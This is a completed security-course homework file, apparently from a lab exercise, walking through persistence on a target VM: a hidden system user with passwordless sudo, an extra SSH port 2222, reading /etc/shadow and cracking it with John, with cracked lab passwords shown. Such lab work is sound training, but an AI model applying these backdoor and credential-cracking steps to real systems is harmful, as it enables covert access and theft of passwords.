## Week 6 Homework Submission File: Advanced Bash - Owning the System

Please edit this file by adding the solution commands on the line below the prompt. 

Save and submit the completed file for your homework submission.

**Step 1: Shadow People** 

1. Create a secret user named `sysd`. Make sure this user doesn't have a home folder created:
    - `Your solution command here`: **sudo adduser --no-create-home sysd**

2. Give your secret user a password: 
    - `Your solution command here`: **sudo passwd sysd** (**The passwd is set during adduser, this command helps to reset if required or create a new one if passwd hasn't already been set**)

3. Give your secret user a system UID < 1000:
    - `Your solution command here`: **sudo usermod -u 333 sysd**

4. Give your secret user the same GID:
   - `Your solution command here`: **sudo groupmod -g 333 sysd**

5. Give your secret user full `sudo` access without the need for a password:
   - `Your solution command here`: **sudo visudo  **

     **In the /etc/sudoers file add the line to the end of file:**
     
     ***sysd ALL=(ALL:ALL) NOPASSWD:ALL***
   
6. Test that `sudo` access works without your password:

    ```bash
    Your bash commands here: 
    su sysd
    #Once, I got into sysd, I tried the below commands and they executed.
    sudo -l
    sudo less /etc/shadow
    sudo su root
    
    Below is a capture of what came up on the screen:
    (1) sysd@scavenger-hunt:/$ sudo -l
    Matching Defaults entries for sysd on scavenger-hunt:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
    
    User sysd may run the following commands on scavenger-hunt:
        (ALL : ALL) NOPASSWD: ALL
    
    
    (2) The sudo less /etc/shadow brought up the shadow file...
    
    (3) sysd@scavenger-hunt:/$ sudo su root
    
    You found flag_7:$1$zmr05X2t$QfOdeJVDpph5pBPpVL6oy0
    
    root@scavenger-hunt:/# 
    #I am in root now, without entering a password for root.
    
    ```

**Step 2: Smooth Sailing**

1. Edit the `sshd_config` file:

    Being in root first, I edited the /etc/ssh/sshd_config file. I uncommented the Port 22 and added a line Port 2222 below it and saved the file. Below is an excerpt of the sshd_config.file.
    
    ```bash
    Your bash commands here:
    root@scavenger-hunt:/# nano /etc/ssh/sshd_config
    
    #       $OpenBSD: sshd_config,v 1.101 2017/03/14 07:19:07 djm Exp $
    
    # This is the sshd server system-wide configuration file.  See
    # sshd_config(5) for more information.
    
    # This sshd was compiled with PATH=/usr/bin:/bin:/usr/sbin:/sbin
    
    # The strategy used for options in the default sshd_config shipped with
    # OpenSSH is to specify options with their default value where
    # possible, but leave them commented.  Uncommented options override the
    # default value.
    
    Port 22
    Port 2222
    #AddressFamily any
    
    ```

**Step 3: Testing Your Configuration Update**

1. Restart the SSH service:
    - `Your solution command here`: **systemctl restart ssh**

      [root@scavenger-hunt:/# systemctl restart ssh
      root@scavenger-hunt:/# systemctl status ssh
      ● ssh.service - OpenBSD Secure Shell server
         Loaded: loaded (/lib/systemd/system/ssh.service; enabled; vendor preset: enabled)
         Active: active (running) since Tue 2021-10-19 03:15:32 UTC; 17s ago
        Process: 1632 ExecStartPre=/usr/sbin/sshd -t (code=exited, status=0/SUCCESS)
       Main PID: 1643 (sshd)
          Tasks: 1 (limit: 1105)
         CGroup: /system.slice/ssh.service
                 └─1643 /usr/sbin/sshd -D
    
      Oct 19 03:15:32 scavenger-hunt systemd[1]: Starting OpenBSD Secure Shell server...
      Oct 19 03:15:32 scavenger-hunt sshd[1643]: Server listening on 0.0.0.0 port 2222.
      Oct 19 03:15:32 scavenger-hunt sshd[1643]: Server listening on :: port 2222.
      Oct 19 03:15:32 scavenger-hunt sshd[1643]: Server listening on 0.0.0.0 port 22.
      Oct 19 03:15:32 scavenger-hunt sshd[1643]: Server listening on :: port 22.
      Oct 19 03:15:32 scavenger-hunt systemd[1]: Started OpenBSD Secure Shell server.]
    
2. Exit the `root` account:
    - `Your solution command here`: **exit**

3. SSH to the target machine using your `sysd` account and port `2222`:
    - `Your solution command here` : **ssh sysd@192.168.6.105 -p 2222**

4. Use `sudo` to switch to the root user:
    - `Your solution command here`: **sudo su**

**Step 4: Crack All the Passwords**

1. SSH back to the system using your `sysd` account and port `2222`:

    - `Your solution command here`: **ssh sysd@192.168.6.105 -p 2222**

2. Escalate your privileges to the `root` user. Use John to crack the entire `/etc/shadow` file:

    - `Your solution command here`: **sudo su**
    
    - **john /etc/shadow**
    
    - Below is the results after running john.
    
    - root@scavenger-hunt:/# john /etc/shadow
      Created directory: /root/.john
      Loaded 8 password hashes with 8 different salts (crypt, generic crypt(3) [?/64])
      Press 'q' or Ctrl-C to abort, almost any other key for status
      0g 0:00:00:12 28% 1/3 0g/s 422.9p/s 422.9c/s 422.9C/s 99999t!..et99999
      computer         (stallman)
      freedom          (babbage)
      trustno1         (mitnik)
      dragon           (lovelace)
      lakers           (turing)
      passw0rd         (sysadmin)
    
      Goodluck!        (student)
    
      Chocolate       (sysd)

---

© 2020 Trilogy Education Services, a 2U, Inc. brand. All Rights Reserved.

